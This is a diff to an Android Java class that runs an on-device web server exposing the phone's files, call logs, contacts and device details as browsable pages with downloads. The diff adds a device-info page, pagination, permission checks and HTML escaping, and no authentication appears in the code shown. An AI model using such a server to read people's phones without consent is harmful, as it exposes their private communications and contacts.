@@ -1,10 +1,13 @@
 package com.security.ravan;
 
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.os.Build;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.Manifest;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -39,8 +42,8 @@ public class RavanHttpServer extends NanoHTTPD {
             ".header h1 { font-size: 2.5rem; background: linear-gradient(90deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }"
             +
             ".header p { color: #888; }" +
-            ".nav { display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; margin-bottom: 30px; }" +
-            ".nav a { padding: 12px 24px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.1); }"
+            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 30px; }" +
+            ".nav a { padding: 12px 20px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.1); font-size: 0.9rem; }"
             +
             ".nav a:hover { background: rgba(233, 69, 96, 0.3); border-color: #e94560; transform: translateY(-2px); }" +
             ".card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }"
@@ -66,8 +69,9 @@ public class RavanHttpServer extends NanoHTTPD {
             ".breadcrumb a { color: #e94560; text-decoration: none; }" +
             ".breadcrumb span { color: #666; }" +
             "table { width: 100%; border-collapse: collapse; margin-top: 15px; }" +
-            "th, td { padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }" +
-            "th { background: rgba(233, 69, 96, 0.2); color: #e94560; font-weight: 600; }" +
+            "th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }" +
+            "th { background: rgba(233, 69, 96, 0.2); color: #e94560; font-weight: 600; font-size: 0.85rem; }" +
+            "td { font-size: 0.9rem; }" +
             "tr:hover { background: rgba(255,255,255,0.03); }" +
             ".call-incoming { color: #2ecc71; }" +
             ".call-outgoing { color: #3498db; }" +
@@ -76,8 +80,23 @@ public class RavanHttpServer extends NanoHTTPD {
             +
             ".empty-state { text-align: center; padding: 60px 20px; color: #888; }" +
             ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; }" +
-            "@media (max-width: 768px) { .header h1 { font-size: 1.8rem; } .nav a { padding: 10px 16px; font-size: 0.9rem; } th, td { padding: 10px 8px; font-size: 0.85rem; } }"
+            ".info-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 20px; margin-bottom: 15px; }" +
+            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 12px; }" +
+            ".info-item { display: flex; justify-content: space-between; padding: 10px 15px; background: rgba(255,255,255,0.03); border-radius: 8px; }"
             +
+            ".info-label { color: #888; font-size: 0.85rem; }" +
+            ".info-value { color: #fff; font-weight: 500; font-size: 0.85rem; }" +
+            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 20px; }" +
+            ".pagination a { padding: 8px 16px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; }"
+            +
+            ".pagination a:hover { background: rgba(233, 69, 96, 0.3); }" +
+            ".pagination .active { background: #e94560; }" +
+            "@media (max-width: 768px) { " +
+            ".header h1 { font-size: 1.8rem; } " +
+            ".nav a { padding: 10px 14px; font-size: 0.8rem; } " +
+            "th, td { padding: 8px 6px; font-size: 0.75rem; } " +
+            ".info-grid { grid-template-columns: 1fr; } " +
+            "}" +
             "</style>" +
             "</head>" +
             "<body>" +
@@ -88,6 +107,7 @@ public class RavanHttpServer extends NanoHTTPD {
             "</div>" +
             "<div class=\"nav\">" +
             "<a href=\"/\">Home</a>" +
+            "<a href=\"/device\">Device Info</a>" +
             "<a href=\"/files\">Files</a>" +
             "<a href=\"/calls\">Call Logs</a>" +
             "<a href=\"/contacts\">Contacts</a>" +
@@ -110,12 +130,14 @@ public class RavanHttpServer extends NanoHTTPD {
         try {
             if (uri.equals("/") || uri.isEmpty()) {
                 return serveHome();
+            } else if (uri.equals("/device")) {
+                return serveDeviceInfo();
             } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                 return serveFiles(uri, params);
             } else if (uri.equals("/calls")) {
-                return serveCallLogs();
+                return serveCallLogs(params);
             } else if (uri.equals("/contacts")) {
-                return serveContacts();
+                return serveContacts(params);
             } else if (uri.startsWith("/download/")) {
                 return serveDownload(uri);
             } else {
@@ -155,24 +177,40 @@ public class RavanHttpServer extends NanoHTTPD {
                 "</div>" +
                 "<div class=\"card\">" +
                 "<h2 style=\"margin-bottom: 20px;\">Quick Access</h2>" +
-                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">"
+                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px;\">"
                 +
-                "<a href=\"/files\" style=\"padding: 30px 20px; background: linear-gradient(135deg, rgba(52, 152, 219, 0.2), rgba(41, 128, 185, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(52, 152, 219, 0.3);\">"
+                "<a href=\"/device\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(155, 89, 182, 0.2), rgba(142, 68, 173, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(155, 89, 182, 0.3);\">"
                 +
-                "<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">&#128193;</div>" +
-                "<div style=\"color: #3498db; font-weight: 600;\">File Manager</div>" +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128241;</div>" +
+                "<div style=\"color: #9b59b6; font-weight: 600; font-size: 0.9rem;\">Device Info</div>" +
                 "</a>" +
-                "<a href=\"/calls\" style=\"padding: 30px 20px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(46, 204, 113, 0.3);\">"
+                "<a href=\"/files\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(52, 152, 219, 0.2), rgba(41, 128, 185, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(52, 152, 219, 0.3);\">"
                 +
-                "<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">&#128222;</div>" +
-                "<div style=\"color: #2ecc71; font-weight: 600;\">Call Logs</div>" +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128193;</div>" +
+                "<div style=\"color: #3498db; font-weight: 600; font-size: 0.9rem;\">File Manager</div>" +
                 "</a>" +
-                "<a href=\"/contacts\" style=\"padding: 30px 20px; background: linear-gradient(135deg, rgba(155, 89, 182, 0.2), rgba(142, 68, 173, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(155, 89, 182, 0.3);\">"
+                "<a href=\"/calls\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.2), rgba(39, 174, 96, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(46, 204, 113, 0.3);\">"
                 +
-                "<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">&#128101;</div>" +
-                "<div style=\"color: #9b59b6; font-weight: 600;\">Contacts</div>" +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128222;</div>" +
+                "<div style=\"color: #2ecc71; font-weight: 600; font-size: 0.9rem;\">Call Logs</div>" +
+                "</a>" +
+                "<a href=\"/contacts\" style=\"padding: 25px 15px; background: linear-gradient(135deg, rgba(230, 126, 34, 0.2), rgba(211, 84, 0, 0.1)); border-radius: 15px; text-decoration: none; text-align: center; border: 1px solid rgba(230, 126, 34, 0.3);\">"
+                +
+                "<div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128101;</div>" +
+                "<div style=\"color: #e67e22; font-weight: 600; font-size: 0.9rem;\">Contacts</div>" +
                 "</a>" +
                 "</div>" +
+                "</div>" +
+                HTML_FOOTER;
+
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveDeviceInfo() {
+        String html = HTML_HEADER +
+                "<div class=\"card\">" +
+                "<h2 style=\"margin-bottom: 20px;\">Device Information</h2>" +
+                DeviceInfo.getDeviceInfoHtml(context) +
                 "</div>" +
                 HTML_FOOTER;
 
@@ -299,79 +337,188 @@ public class RavanHttpServer extends NanoHTTPD {
         return serveFileDownload(file);
     }
 
-    private Response serveCallLogs() {
+    private Response serveCallLogs(Map<String, String> params) {
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");
 
+        // Check permission first
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
+                html.append("<p>Call log permission not granted.</p>");
+                html.append(
+                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
+                html.append("</div>");
+                html.append("</div>");
+                html.append(HTML_FOOTER);
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+            }
+        }
+
+        // Pagination
+        int page = 1;
+        int limit = 50;
         try {
-            Cursor cursor = context.getContentResolver().query(
+            if (params.containsKey("page")) {
+                page = Integer.parseInt(params.get("page"));
+                if (page < 1)
+                    page = 1;
+            }
+        } catch (Exception e) {
+            page = 1;
+        }
+        int offset = (page - 1) * limit;
+
+        Cursor cursor = null;
+        try {
+            // Query for call logs - compatible with Android 13+
+            String[] projection = new String[] {
+                    CallLog.Calls._ID,
+                    CallLog.Calls.NUMBER,
+                    CallLog.Calls.CACHED_NAME,
+                    CallLog.Calls.TYPE,
+                    CallLog.Calls.DATE,
+                    CallLog.Calls.DURATION
+            };
+
+            String sortOrder = CallLog.Calls.DATE + " DESC";
+
+            cursor = context.getContentResolver().query(
                     CallLog.Calls.CONTENT_URI,
-                    new String[] {
-                            CallLog.Calls.NUMBER,
-                            CallLog.Calls.CACHED_NAME,
-                            CallLog.Calls.TYPE,
-                            CallLog.Calls.DATE,
-                            CallLog.Calls.DURATION
-                    },
-                    null, null,
-                    CallLog.Calls.DATE + " DESC LIMIT 100");
+                    projection,
+                    null,
+                    null,
+                    sortOrder);
 
             if (cursor != null && cursor.getCount() > 0) {
+                int totalCount = cursor.getCount();
+                int totalPages = (int) Math.ceil((double) totalCount / limit);
+
+                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
+                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");
+
+                html.append("<div style=\"overflow-x: auto;\">");
                 html.append("<table>");
                 html.append("<thead><tr>");
                 html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th>");
                 html.append("</tr></thead><tbody>");
 
+                int count = 0;
+                int skipped = 0;
+
                 while (cursor.moveToNext()) {
-                    String number = cursor.getString(0);
-                    String name = cursor.getString(1);
-                    int type = cursor.getInt(2);
-                    long date = cursor.getLong(3);
-                    int duration = cursor.getInt(4);
+                    // Skip to offset
+                    if (skipped < offset) {
+                        skipped++;
+                        continue;
+                    }
+
+                    // Limit results
+                    if (count >= limit)
+                        break;
+
+                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
+                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
+                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
+                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
+                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
+
+                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
+                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
+                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
+                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
+                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;
 
                     String typeIcon, typeClass;
                     switch (type) {
                         case CallLog.Calls.INCOMING_TYPE:
-                            typeIcon = "Incoming";
+                            typeIcon = "&#8595; In";
                             typeClass = "call-incoming";
                             break;
                         case CallLog.Calls.OUTGOING_TYPE:
-                            typeIcon = "Outgoing";
+                            typeIcon = "&#8593; Out";
                             typeClass = "call-outgoing";
                             break;
                         case CallLog.Calls.MISSED_TYPE:
-                            typeIcon = "Missed";
+                            typeIcon = "&#10006; Missed";
+                            typeClass = "call-missed";
+                            break;
+                        case CallLog.Calls.REJECTED_TYPE:
+                            typeIcon = "&#10006; Rejected";
+                            typeClass = "call-missed";
+                            break;
+                        case CallLog.Calls.BLOCKED_TYPE:
+                            typeIcon = "&#128683; Blocked";
                             typeClass = "call-missed";
                             break;
                         default:
-                            typeIcon = "Other";
+                            typeIcon = "&#128222; Other";
                             typeClass = "";
                     }
 
                     html.append("<tr>");
                     html.append("<td class=\"").append(typeClass).append("\">").append(typeIcon).append("</td>");
-                    html.append("<td>").append(name != null ? name : "-").append("</td>");
-                    html.append("<td>").append(number).append("</td>");
+                    html.append("<td>").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
+                            .append("</td>");
+                    html.append("<td>").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                     html.append("<td>").append(
                             new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                             .append("</td>");
                     html.append("<td>").append(formatDuration(duration)).append("</td>");
                     html.append("</tr>");
+
+                    count++;
                 }
 
-                cursor.close();
                 html.append("</tbody></table>");
+                html.append("</div>");
+
+                // Pagination links
+                if (totalPages > 1) {
+                    html.append("<div class=\"pagination\">");
+                    if (page > 1) {
+                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
+                    }
+
+                    int startPage = Math.max(1, page - 2);
+                    int endPage = Math.min(totalPages, page + 2);
+
+                    for (int i = startPage; i <= endPage; i++) {
+                        if (i == page) {
+                            html.append("<a class=\"active\" href=\"/calls?page=").append(i).append("\">").append(i)
+                                    .append("</a>");
+                        } else {
+                            html.append("<a href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
+                        }
+                    }
+
+                    if (page < totalPages) {
+                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
+                    }
+                    html.append("</div>");
+                }
             } else {
                 html.append(
                         "<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
             }
         } catch (SecurityException e) {
-            html.append(
-                    "<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>Permission denied. Please grant call log permission in the app.</p></div>");
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
+            html.append("<p>Permission denied.</p>");
+            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
+                    .append("</p>");
+            html.append("</div>");
         } catch (Exception e) {
-            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(e.getMessage())
-                    .append("</p></div>");
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
+            html.append("<p>Error loading call logs</p>");
+            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
+                    .append("</p>");
+            html.append("</div>");
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
         }
 
         html.append("</div>");
@@ -380,13 +527,42 @@ public class RavanHttpServer extends NanoHTTPD {
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 
-    private Response serveContacts() {
+    private Response serveContacts(Map<String, String> params) {
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">Contacts</h2>");
 
+        // Check permission first
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
+                html.append("<p>Contacts permission not granted.</p>");
+                html.append(
+                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
+                html.append("</div>");
+                html.append("</div>");
+                html.append(HTML_FOOTER);
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+            }
+        }
+
+        // Pagination
+        int page = 1;
+        int limit = 50;
         try {
-            Cursor cursor = context.getContentResolver().query(
+            if (params.containsKey("page")) {
+                page = Integer.parseInt(params.get("page"));
+                if (page < 1)
+                    page = 1;
+            }
+        } catch (Exception e) {
+            page = 1;
+        }
+        int offset = (page - 1) * limit;
+
+        Cursor cursor = null;
+        try {
+            cursor = context.getContentResolver().query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                     new String[] {
                             ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
@@ -396,12 +572,30 @@ public class RavanHttpServer extends NanoHTTPD {
                     ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
 
             if (cursor != null && cursor.getCount() > 0) {
+                int totalCount = cursor.getCount();
+                int totalPages = (int) Math.ceil((double) totalCount / limit);
+
+                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
+                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");
+
+                html.append("<div style=\"overflow-x: auto;\">");
                 html.append("<table>");
                 html.append("<thead><tr>");
                 html.append("<th>Name</th><th>Phone Number</th>");
                 html.append("</tr></thead><tbody>");
 
+                int count = 0;
+                int skipped = 0;
+
                 while (cursor.moveToNext()) {
+                    if (skipped < offset) {
+                        skipped++;
+                        continue;
+                    }
+
+                    if (count >= limit)
+                        break;
+
                     String name = cursor.getString(0);
                     String number = cursor.getString(1);
                     String initial = name != null && !name.isEmpty() ? name.substring(0, 1).toUpperCase() : "?";
@@ -409,24 +603,61 @@ public class RavanHttpServer extends NanoHTTPD {
                     html.append("<tr>");
                     html.append("<td style=\"display: flex; align-items: center;\">");
                     html.append("<div class=\"contact-avatar\">").append(initial).append("</div>");
-                    html.append("<span>").append(name != null ? name : "Unknown").append("</span>");
+                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                     html.append("</td>");
-                    html.append("<td>").append(number).append("</td>");
+                    html.append("<td>").append(number != null ? escapeHtml(number) : "N/A").append("</td>");
                     html.append("</tr>");
+
+                    count++;
                 }
 
-                cursor.close();
                 html.append("</tbody></table>");
+                html.append("</div>");
+
+                // Pagination links
+                if (totalPages > 1) {
+                    html.append("<div class=\"pagination\">");
+                    if (page > 1) {
+                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
+                    }
+
+                    int startPage = Math.max(1, page - 2);
+                    int endPage = Math.min(totalPages, page + 2);
+
+                    for (int i = startPage; i <= endPage; i++) {
+                        if (i == page) {
+                            html.append("<a class=\"active\" href=\"/contacts?page=").append(i).append("\">").append(i)
+                                    .append("</a>");
+                        } else {
+                            html.append("<a href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
+                        }
+                    }
+
+                    if (page < totalPages) {
+                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
+                    }
+                    html.append("</div>");
+                }
             } else {
                 html.append(
                         "<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
             }
         } catch (SecurityException e) {
-            html.append(
-                    "<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>Permission denied. Please grant contacts permission in the app.</p></div>");
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
+            html.append("<p>Permission denied.</p>");
+            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
+                    .append("</p>");
+            html.append("</div>");
         } catch (Exception e) {
-            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(e.getMessage())
-                    .append("</p></div>");
+            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
+            html.append("<p>Error loading contacts</p>");
+            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
+                    .append("</p>");
+            html.append("</div>");
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
         }
 
         html.append("</div>");
@@ -456,11 +687,21 @@ public class RavanHttpServer extends NanoHTTPD {
                 "<div class=\"empty-state\">" +
                 "<div class=\"icon\">&#9888;</div>" +
                 "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
-                "<p>" + message + "</p>" +
+                "<p>" + escapeHtml(message) + "</p>" +
                 "</div>" +
                 "</div>" +
                 HTML_FOOTER;
         return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
+    }
+
+    private String escapeHtml(String text) {
+        if (text == null)
+            return "";
+        return text.replace("&", "&amp;")
+                .replace("<", "&lt;")
+                .replace(">", "&gt;")
+                .replace("\"", "&quot;")
+                .replace("'", "&#39;");
     }
 
     private String getFileIcon(File file) {
